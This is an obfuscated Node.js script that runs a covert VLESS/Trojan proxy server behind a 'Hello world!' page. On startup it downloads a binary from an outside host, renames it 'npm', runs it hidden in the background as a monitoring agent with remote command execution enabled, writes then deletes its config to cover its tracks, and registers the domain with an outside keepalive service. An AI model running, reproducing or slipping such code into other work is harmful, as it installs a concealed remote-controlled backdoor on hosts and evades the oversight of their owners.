const _0x4cabba=_0x52d4;(function(_0x39826f,_0x2445c8){const _0x1144fa=_0x52d4,_0x21fe00=_0x39826f();while(!![]){try{const _0x3c8fc8=-parseInt(_0x1144fa(0xac))/0x1*(-parseInt(_0x1144fa(0x85))/0x2)+parseInt(_0x1144fa(0xb7))/0x3*(-parseInt(_0x1144fa(0x74))/0x4)+parseInt(_0x1144fa(0x9e))/0x5*(-parseInt(_0x1144fa(0x92))/0x6)+parseInt(_0x1144fa(0xbc))/0x7*(-parseInt(_0x1144fa(0x7c))/0x8)+-parseInt(_0x1144fa(0x76))/0x9+parseInt(_0x1144fa(0xe6))/0xa*(parseInt(_0x1144fa(0xbf))/0xb)+parseInt(_0x1144fa(0x8a))/0xc;if(_0x3c8fc8===_0x2445c8)break;else _0x21fe00['push'](_0x21fe00['shift']());}catch(_0x4d5f20){_0x21fe00['push'](_0x21fe00['shift']());}}}(_0x459c,0x64354));const os=require('os'),http=require(_0x4cabba(0x80)),fs=require('fs'),axios=require(_0x4cabba(0xd1)),net=require('net'),path=require(_0x4cabba(0xed)),crypto=require(_0x4cabba(0xd4)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x4cabba(0xa6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4cabba(0xb1)][_0x4cabba(0xbd)]||'5efabea4-f1d4-92fd-b8f0-dde004c89c60',NEZHA_SERVER=process[_0x4cabba(0xb1)][_0x4cabba(0x77)]||'',NEZHA_PORT=process[_0x4cabba(0xb1)][_0x4cabba(0x99)]||'',NEZHA_KEY=process['env'][_0x4cabba(0xb4)]||'',DOMAIN=process[_0x4cabba(0xb1)]['DOMAIN']||_0x4cabba(0xcc),AUTO_ACCESS=process[_0x4cabba(0xb1)][_0x4cabba(0xa2)]||!![],WSPATH=process[_0x4cabba(0xb1)][_0x4cabba(0xe5)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x4cabba(0xb1)]['SUB_PATH']||_0x4cabba(0xb2),NAME=process[_0x4cabba(0xb1)][_0x4cabba(0xad)]||'',PORT=process[_0x4cabba(0xb1)]['PORT']||0x1eb4;let ISP='';function _0x52d4(_0x201726,_0x2b5461){_0x201726=_0x201726-0x6f;const _0x459c69=_0x459c();let _0x52d468=_0x459c69[_0x201726];return _0x52d468;}const GetISP=async()=>{const _0x1941a7=_0x4cabba;try{const _0x517718=await axios[_0x1941a7(0x7f)]('https://api.ip.sb/geoip'),_0x281d13=_0x517718['data'];ISP=(_0x281d13[_0x1941a7(0x8e)]+'-'+_0x281d13[_0x1941a7(0xd9)])[_0x1941a7(0xa3)](/ /g,'_');}catch(_0x53a7de){ISP=_0x1941a7(0xa5);}};GetISP();const httpServer=http[_0x4cabba(0x70)]((_0x4b049a,_0x184cb6)=>{const _0x44c40c=_0x4cabba;if(_0x4b049a[_0x44c40c(0xd2)]==='/'){const _0x2918f1=path[_0x44c40c(0xe7)](__dirname,'index.html');fs[_0x44c40c(0xa0)](_0x2918f1,'utf8',(_0x20c05e,_0x301584)=>{const _0x346b76=_0x44c40c;if(_0x20c05e){_0x184cb6[_0x346b76(0x7d)](0xc8,{'Content-Type':'text/html'}),_0x184cb6['end'](_0x346b76(0x8d));return;}_0x184cb6['writeHead'](0xc8,{'Content-Type':_0x346b76(0xaf)}),_0x184cb6[_0x346b76(0x8b)](_0x301584);});return;}else{if(_0x4b049a[_0x44c40c(0xd2)]==='/'+SUB_PATH){const _0x35b149=NAME?NAME+'-'+ISP:ISP,_0x36d2c1=_0x44c40c(0xcd)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x44c40c(0xc3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x35b149,_0x402040=_0x44c40c(0xec)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x44c40c(0xc3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x35b149,_0x5adaf3=_0x36d2c1+'\x0a'+_0x402040,_0x33f025=Buffer[_0x44c40c(0x81)](_0x5adaf3)[_0x44c40c(0xc8)](_0x44c40c(0xde));_0x184cb6[_0x44c40c(0x7d)](0xc8,{'Content-Type':_0x44c40c(0x86)}),_0x184cb6['end'](_0x33f025+'\x0a');}else _0x184cb6[_0x44c40c(0x7d)](0x194,{'Content-Type':'text/plain'}),_0x184cb6['end'](_0x44c40c(0x93));}}),wss=new WebSocket[(_0x4cabba(0xc1))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4cabba(0x71)];function _0x459c(){const _0x2b49af=['336GbSllQ','writeHead','npm\x20running\x20error:','get','http','from','update','includes','npm\x20is\x20running','4qwprUV','text/plain','pop','true','digest','13005156kWiojr','end','client_secret:\x20','Hello\x20world!','country_code','chmod\x20+x\x20npm','arm64','once','12fbXZEl','Not\x20Found\x0a','Status','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','arch','https://amd64.ssss.nyc.mn/agent','NEZHA_PORT','data','catch','slice','write','543835xpnWGk','close','readFile','every','AUTO_ACCESS','replace','split','Unknown','child_process','stream','&type=A','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','false','2096','170299exvhDm','NAME','error','text/html','npm','env','sub','2083','NEZHA_KEY','test','Server\x20is\x20running\x20on\x20port\x20','20682VFGBMH','npm\x20download\x20successfully','readUInt16BE','\x20with\x20all\x20DNS\x20servers','unlink','123802AeyUYa','UUID','decode','22HaoLQY','writeFileSync','Server','application/dns-json','&fp=chrome&type=ws&host=','createWriteStream','connect','https://oooo.serv00.net/add-url','error:\x20','toString','https://amd64.ssss.nyc.mn/v1','substr','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','1234.abc.com','vless://','arm','443','reduce','axios','url','/bin/bash','crypto','https://dns.google/resolve?name=','readUInt8','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','concat','isp','https://','Answer','createHash','npm\x20is\x20already\x20running,\x20skip\x20running...','base64','sha224','Failed\x20to\x20resolve\x20','map','log','post','length','WSPATH','639490Qwrsln','join','https://arm64.ssss.nyc.mn/agent','hex','config.yaml','finish','trojan://','path','trim','find','createServer','1.1.1.1','setsid\x20nohup\x20./npm\x20-s\x20','pipe','40PfLSPW','then','1012689mESZhN','NEZHA_SERVER','utf-8','2053','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','aarch64'];_0x459c=function(){return _0x2b49af;};return _0x459c();}function resolveHost(_0x2adfc9){return new Promise((_0x1a5127,_0x5c39a5)=>{const _0x39149c=_0x52d4;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x39149c(0xb5)](_0x2adfc9)){_0x1a5127(_0x2adfc9);return;}let _0x3b73c7=0x0;function _0x4b0ad9(){const _0x485ab2=_0x39149c;if(_0x3b73c7>=DNS_SERVERS[_0x485ab2(0xe4)]){_0x5c39a5(new Error(_0x485ab2(0xe0)+_0x2adfc9+_0x485ab2(0xba)));return;}const _0x132d15=DNS_SERVERS[_0x3b73c7];_0x3b73c7++;const _0x10866a=_0x485ab2(0xd5)+encodeURIComponent(_0x2adfc9)+_0x485ab2(0xa8);axios[_0x485ab2(0x7f)](_0x10866a,{'timeout':0x1388,'headers':{'Accept':_0x485ab2(0xc2)}})[_0x485ab2(0x75)](_0xfbe11b=>{const _0x13c519=_0x485ab2,_0xd01b73=_0xfbe11b[_0x13c519(0x9a)];if(_0xd01b73[_0x13c519(0x94)]===0x0&&_0xd01b73[_0x13c519(0xdb)]&&_0xd01b73['Answer'][_0x13c519(0xe4)]>0x0){const _0x5b3aaf=_0xd01b73[_0x13c519(0xdb)][_0x13c519(0x6f)](_0x2ad320=>_0x2ad320['type']===0x1);if(_0x5b3aaf){_0x1a5127(_0x5b3aaf[_0x13c519(0x9a)]);return;}}_0x4b0ad9();})[_0x485ab2(0x9b)](_0x120859=>{_0x4b0ad9();});}_0x4b0ad9();});}function handleVlessConnection(_0x2da4ca,_0x457c08){const _0x3520de=_0x4cabba,[_0x595800]=_0x457c08,_0x4ee6e8=_0x457c08[_0x3520de(0x9c)](0x1,0x11);if(!_0x4ee6e8[_0x3520de(0xa1)]((_0x4beaa9,_0x14de0e)=>_0x4beaa9==parseInt(uuid[_0x3520de(0xca)](_0x14de0e*0x2,0x2),0x10)))return![];let _0x28f8c1=_0x457c08[_0x3520de(0x9c)](0x11,0x12)[_0x3520de(0xd6)]()+0x13;const _0x4eec61=_0x457c08['slice'](_0x28f8c1,_0x28f8c1+=0x2)[_0x3520de(0xb9)](0x0),_0x10db2d=_0x457c08[_0x3520de(0x9c)](_0x28f8c1,_0x28f8c1+=0x1)[_0x3520de(0xd6)](),_0x5a22ab=_0x10db2d==0x1?_0x457c08['slice'](_0x28f8c1,_0x28f8c1+=0x4)[_0x3520de(0xe7)]('.'):_0x10db2d==0x2?new TextDecoder()[_0x3520de(0xbe)](_0x457c08[_0x3520de(0x9c)](_0x28f8c1+0x1,_0x28f8c1+=0x1+_0x457c08[_0x3520de(0x9c)](_0x28f8c1,_0x28f8c1+0x1)['readUInt8']())):_0x10db2d==0x3?_0x457c08['slice'](_0x28f8c1,_0x28f8c1+=0x10)[_0x3520de(0xd0)]((_0x7893c8,_0x1acb70,_0x3e6483,_0x255522)=>_0x3e6483%0x2?_0x7893c8['concat'](_0x255522['slice'](_0x3e6483-0x1,_0x3e6483+0x1)):_0x7893c8,[])[_0x3520de(0xe1)](_0x2a7666=>_0x2a7666[_0x3520de(0xb9)](0x0)[_0x3520de(0xc8)](0x10))[_0x3520de(0xe7)](':'):'';_0x2da4ca['send'](new Uint8Array([_0x595800,0x0]));const _0x99bf86=createWebSocketStream(_0x2da4ca);return resolveHost(_0x5a22ab)[_0x3520de(0x75)](_0x15183b=>{const _0xf6b790=_0x3520de;net[_0xf6b790(0xc5)]({'host':_0x15183b,'port':_0x4eec61},function(){const _0x330a9b=_0xf6b790;this[_0x330a9b(0x9d)](_0x457c08[_0x330a9b(0x9c)](_0x28f8c1)),_0x99bf86['on'](_0x330a9b(0xae),()=>{})['pipe'](this)['on'](_0x330a9b(0xae),()=>{})['pipe'](_0x99bf86);})['on'](_0xf6b790(0xae),()=>{});})[_0x3520de(0x9b)](_0x19b49a=>{const _0x1a180a=_0x3520de;net[_0x1a180a(0xc5)]({'host':_0x5a22ab,'port':_0x4eec61},function(){const _0x1ae697=_0x1a180a;this[_0x1ae697(0x9d)](_0x457c08['slice'](_0x28f8c1)),_0x99bf86['on']('error',()=>{})['pipe'](this)['on'](_0x1ae697(0xae),()=>{})[_0x1ae697(0x73)](_0x99bf86);})['on'](_0x1a180a(0xae),()=>{});}),!![];}function handleTrojanConnection(_0x252b29,_0x1bee69){const _0x8e502=_0x4cabba;try{if(_0x1bee69[_0x8e502(0xe4)]<0x3a)return![];const _0x3f09d5=_0x1bee69[_0x8e502(0x9c)](0x0,0x38)[_0x8e502(0xc8)](),_0x1c4e01=[UUID];let _0x46c68d=null;for(const _0x566777 of _0x1c4e01){const _0x398f5f=crypto[_0x8e502(0xdc)](_0x8e502(0xdf))[_0x8e502(0x82)](_0x566777)[_0x8e502(0x89)](_0x8e502(0xe9));if(_0x398f5f===_0x3f09d5){_0x46c68d=_0x566777;break;}}if(!_0x46c68d)return![];let _0x3aac1a=0x38;_0x1bee69[_0x3aac1a]===0xd&&_0x1bee69[_0x3aac1a+0x1]===0xa&&(_0x3aac1a+=0x2);const _0x35f6b8=_0x1bee69[_0x3aac1a];if(_0x35f6b8!==0x1)return![];_0x3aac1a+=0x1;const _0x35a976=_0x1bee69[_0x3aac1a];_0x3aac1a+=0x1;let _0x3d5c21,_0x1fb3eb;if(_0x35a976===0x1)_0x3d5c21=_0x1bee69[_0x8e502(0x9c)](_0x3aac1a,_0x3aac1a+0x4)['join']('.'),_0x3aac1a+=0x4;else{if(_0x35a976===0x3){const _0x5c97fe=_0x1bee69[_0x3aac1a];_0x3aac1a+=0x1,_0x3d5c21=_0x1bee69[_0x8e502(0x9c)](_0x3aac1a,_0x3aac1a+_0x5c97fe)[_0x8e502(0xc8)](),_0x3aac1a+=_0x5c97fe;}else{if(_0x35a976===0x4)_0x3d5c21=_0x1bee69[_0x8e502(0x9c)](_0x3aac1a,_0x3aac1a+0x10)['reduce']((_0x251a17,_0x3818b7,_0x1a0d39,_0x2ec69b)=>_0x1a0d39%0x2?_0x251a17[_0x8e502(0xd8)](_0x2ec69b[_0x8e502(0x9c)](_0x1a0d39-0x1,_0x1a0d39+0x1)):_0x251a17,[])[_0x8e502(0xe1)](_0x14ea68=>_0x14ea68['readUInt16BE'](0x0)[_0x8e502(0xc8)](0x10))['join'](':'),_0x3aac1a+=0x10;else return![];}}_0x1fb3eb=_0x1bee69['readUInt16BE'](_0x3aac1a),_0x3aac1a+=0x2;_0x3aac1a<_0x1bee69[_0x8e502(0xe4)]&&_0x1bee69[_0x3aac1a]===0xd&&_0x1bee69[_0x3aac1a+0x1]===0xa&&(_0x3aac1a+=0x2);const _0x343d94=createWebSocketStream(_0x252b29);return resolveHost(_0x3d5c21)['then'](_0x8a8942=>{const _0x557883=_0x8e502;net[_0x557883(0xc5)]({'host':_0x8a8942,'port':_0x1fb3eb},function(){const _0x3e1789=_0x557883;_0x3aac1a<_0x1bee69[_0x3e1789(0xe4)]&&this[_0x3e1789(0x9d)](_0x1bee69[_0x3e1789(0x9c)](_0x3aac1a)),_0x343d94['on']('error',()=>{})['pipe'](this)['on'](_0x3e1789(0xae),()=>{})[_0x3e1789(0x73)](_0x343d94);})['on'](_0x557883(0xae),()=>{});})[_0x8e502(0x9b)](_0x504d45=>{const _0xbd5826=_0x8e502;net[_0xbd5826(0xc5)]({'host':_0x3d5c21,'port':_0x1fb3eb},function(){const _0x186923=_0xbd5826;_0x3aac1a<_0x1bee69[_0x186923(0xe4)]&&this[_0x186923(0x9d)](_0x1bee69[_0x186923(0x9c)](_0x3aac1a)),_0x343d94['on']('error',()=>{})[_0x186923(0x73)](this)['on'](_0x186923(0xae),()=>{})[_0x186923(0x73)](_0x343d94);})['on'](_0xbd5826(0xae),()=>{});}),!![];}catch(_0x54c9e9){return![];}}wss['on']('connection',(_0x39d08f,_0x4510b1)=>{const _0x1e5655=_0x4cabba,_0x42778c=_0x4510b1[_0x1e5655(0xd2)]||'';_0x39d08f[_0x1e5655(0x91)]('message',_0xe77cb1=>{const _0x28983f=_0x1e5655;if(_0xe77cb1[_0x28983f(0xe4)]>0x11&&_0xe77cb1[0x0]===0x0){const _0x4da244=_0xe77cb1['slice'](0x1,0x11),_0x125304=_0x4da244[_0x28983f(0xa1)]((_0x2c9ef9,_0x395d26)=>_0x2c9ef9==parseInt(uuid['substr'](_0x395d26*0x2,0x2),0x10));if(_0x125304){!handleVlessConnection(_0x39d08f,_0xe77cb1)&&_0x39d08f['close']();return;}}!handleTrojanConnection(_0x39d08f,_0xe77cb1)&&_0x39d08f[_0x28983f(0x9f)]();})['on'](_0x1e5655(0xae),()=>{});});const getDownloadUrl=()=>{const _0xa27bff=_0x4cabba,_0x2f8e27=os[_0xa27bff(0x97)]();return _0x2f8e27===_0xa27bff(0xce)||_0x2f8e27===_0xa27bff(0x90)||_0x2f8e27===_0xa27bff(0x7b)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0xa27bff(0xe8):!NEZHA_PORT?_0xa27bff(0xc9):_0xa27bff(0x98);},downloadFile=async()=>{const _0x21ffc2=_0x4cabba;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x238398=getDownloadUrl(),_0x4ff97e=await axios({'method':_0x21ffc2(0x7f),'url':_0x238398,'responseType':_0x21ffc2(0xa7)}),_0x214a2a=fs[_0x21ffc2(0xc4)](_0x21ffc2(0xb0));return _0x4ff97e[_0x21ffc2(0x9a)][_0x21ffc2(0x73)](_0x214a2a),new Promise((_0x23a0e8,_0x24f113)=>{const _0x4c57f4=_0x21ffc2;_0x214a2a['on'](_0x4c57f4(0xeb),()=>{const _0x772aff=_0x4c57f4;console[_0x772aff(0xe2)](_0x772aff(0xb8)),exec(_0x772aff(0x8f),_0x1a339e=>{if(_0x1a339e)_0x24f113(_0x1a339e);_0x23a0e8();});}),_0x214a2a['on'](_0x4c57f4(0xae),_0x24f113);});}catch(_0x32fe98){throw _0x32fe98;}},runnz=async()=>{const _0x572a02=_0x4cabba;try{const _0x21962b=execSync(_0x572a02(0xa9),{'encoding':_0x572a02(0x78)});if(_0x21962b[_0x572a02(0xee)]()!==''){console['log'](_0x572a02(0xdd));return;}}catch(_0x572aa0){}await downloadFile();let _0xa75759='',_0x32dc79=[_0x572a02(0xcf),'8443',_0x572a02(0xab),'2087',_0x572a02(0xb3),_0x572a02(0x79)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x154164=_0x32dc79[_0x572a02(0x83)](NEZHA_PORT)?'--tls':'';_0xa75759=_0x572a02(0x72)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x154164+_0x572a02(0x95);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3e2a7f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x572a02(0xa4)](':')[_0x572a02(0x87)]():'',_0xb6602f=_0x32dc79[_0x572a02(0x83)](_0x3e2a7f)?_0x572a02(0x88):_0x572a02(0xaa),_0x4508ab=_0x572a02(0x8c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x572a02(0x96)+_0xb6602f+_0x572a02(0x7a)+UUID;fs[_0x572a02(0xc0)](_0x572a02(0xea),_0x4508ab);}_0xa75759=_0x572a02(0xcb);}else{console[_0x572a02(0xe2)](_0x572a02(0xd7));return;}}try{exec(_0xa75759,{'shell':_0x572a02(0xd3)},_0x48ff6b=>{const _0x4ff4f7=_0x572a02;if(_0x48ff6b)console[_0x4ff4f7(0xae)](_0x4ff4f7(0x7e),_0x48ff6b);else console[_0x4ff4f7(0xe2)](_0x4ff4f7(0x84));});}catch(_0x2352e3){console[_0x572a02(0xae)](_0x572a02(0xc7)+_0x2352e3);}};async function addAccessTask(){const _0x1ce394=_0x4cabba;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xc23b67=_0x1ce394(0xda)+DOMAIN;try{const _0x2a7e7b=await axios[_0x1ce394(0xe3)](_0x1ce394(0xc6),{'url':_0xc23b67},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x12c0a7){}}const delFiles=()=>{const _0x5ecc2c=_0x4cabba;fs[_0x5ecc2c(0xbb)](_0x5ecc2c(0xb0),()=>{}),fs[_0x5ecc2c(0xbb)](_0x5ecc2c(0xea),()=>{});};httpServer['listen'](PORT,()=>{const _0x15f502=_0x4cabba;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x15f502(0xe2)](_0x15f502(0xb6)+PORT);});
